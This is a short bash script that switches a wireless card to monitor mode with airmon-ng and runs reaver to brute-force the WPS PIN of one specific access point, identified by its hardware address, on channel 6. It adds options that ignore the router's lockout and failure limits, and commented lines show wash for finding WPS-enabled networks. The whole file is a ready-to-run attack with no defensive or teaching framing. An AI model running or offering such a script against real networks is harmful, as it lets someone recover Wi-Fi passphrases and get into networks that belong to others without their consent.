#!/bin/bash

sudo airmon-ng start wlan0
#sudo reaver -i mon0 -b a0:f3:c1:a3:96:86 -vv
sudo reaver -i mon0 -f -c 6 -b a0:f3:c1:a3:96:86 --no-nacks --ignore-locks --fail-wait=360 -v --dh-small 

#sudo wash -i mon0 -C -s
